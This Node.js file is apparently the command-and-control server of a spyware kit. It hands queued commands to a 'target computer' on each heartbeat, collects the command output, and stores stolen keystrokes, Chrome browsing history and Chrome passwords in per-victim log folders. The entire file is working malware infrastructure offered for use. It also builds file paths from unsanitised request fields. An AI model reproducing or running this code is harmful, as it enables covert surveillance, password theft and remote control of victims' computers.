const http = require('http')
const fs = require('fs')
const port = 3001
const host = '127.0.0.1'

var dbg_flag = true
var stored_cmd = "";

function print_dbgmsg(msg) {
    if (dbg_flag) console.log(msg)
}


const server = http.createServer(function(request, response) {
    response.setHeader('Access-Control-Allow-Origin', '*');
    response.setHeader('Access-Control-Allow-Methods', '*');
    response.setHeader('Access-Control-Allow-Headers', '*');

    if (request.method == 'POST') {
        console.log("POST")
        var postMessage = ''
        request.on('data', function(data) {
            postMessage += data
        })

        request.on('end', function() {
            parse_message(postMessage, response)
        })

    } else {
        response.writeHead(200, {
            'Content-Type': 'text/html'
        })
        
        fs.readFile('index.html', function(error, data) {
            if (error) {
                response.writeHead(404)
                response.write('Error: File Not Found')
            } else {
                response.write(data)
            }
            response.end()
        })
    }
})

command_response_data = " "

function parse_message(postMessage, response) {
    console.log(postMessage)
    var msg = JSON.parse(postMessage)
    var msg_type = msg.type
    var msg_data = msg.data
    
    if (msg_type == "internal_msg") {
        console.log("Internal Message Recieved \tMessage Type: ", msg_type, "\n Message Data: ", msg_data)
        // Stored command will be sent to target computer during next heartbeat post response
        stored_cmd = msg_data
        send_response(postMessage, response, command_response_data)
        command_response_data = " "
        return
    } else if (msg_type == "cmd_ret") {
        // command response data sent to fontend during next internal message post response
        const decodedString = Buffer.from(msg_data, 'base64').toString();
        console.log(decodedString);
        command_response_data = msg_data;
    } else {
        // Handles any other post request sent from target computer
        var user_id = msg.user_id
        var msg_time = msg.time
        var log_dir = create_log_directory(user_id, msg_type)
        convert_post_request(log_dir, msg_time, msg_type, msg_data)
    }

    send_response(postMessage, response, " ")
}

function create_log_directory(user_id, msg_type) {
    log_dir = "./logs/" + user_id + "/" + msg_type + "/"
    if (!fs.existsSync(log_dir)) {
        fs.mkdirSync(log_dir, { recursive: true })
    }

    return log_dir
}


function send_response(postMessage, response, response_data) {
    console.log("Sending Response")
    msg = JSON.parse(postMessage)
    if (msg.type === 'heartbeat') {
        console.log("heartbeat response: ", stored_cmd)
        response.end(JSON.stringify(stored_cmd))
        stored_cmd = ""
    } else if (msg.type == "internal_msg") {
        response.end(JSON.stringify(response_data))
    } else {
        response.end(JSON.stringify("Response Message"));
        console.log("Response Sent")
    }
}


function convert_post_request(log_dir, time, type, data) {
    switch(type) {
        case "heartbeat":
            print_dbgmsg("Heartbeat Detected")
            break;
        case "keylog":
            print_dbgmsg("Keylog Data Detected")
            keylog_data_handler(log_dir, time, data)
            break;
        case "chrome_history":
            print_dbgmsg("Chrome History Detected")
            chrome_history_data_handler(log_dir, time, data)
            break;
        case "chrome_passwords":
            print_dbgmsg("Chrome Passwords Detected")
            chrome_password_data_handler(log_dir, time, data)
            break;
        case "internal_msg":
            print_dbgmsg("Internal Request Detected")
        default:
            print_dbgmsg("Some Other Data Detected")
    }
}


function base64Decode(base64EncodedData) {
    return Buffer.from(base64EncodedData, 'base64').toString('utf8');
}


function write_to_log_file(filename, message) {
    const base64DecodedData = base64Decode(message)
    console.log(base64DecodedData)

    fs.writeFile(filename, `${base64DecodedData}\n`, (err) => {
        if (err) {console.error(`There was an error writing to the log file: ${err}`);}
    });
}


function keylog_data_handler(log_dir, time, data) {
    keylog_logfile = log_dir + time + ".log"
    write_to_log_file(keylog_logfile, data)
}

function chrome_history_data_handler(log_dir, time, data) {
    chrome_history_logfile = log_dir + time + ".log"
    write_to_log_file(chrome_history_logfile, data)
}

function chrome_password_data_handler(log_dir, time, data) {
    chrome_password_logfile = log_dir + time + ".log"
    write_to_log_file(chrome_password_logfile, data)
}

server.listen(port, host)
console.log("listening on ", host + ":" + port)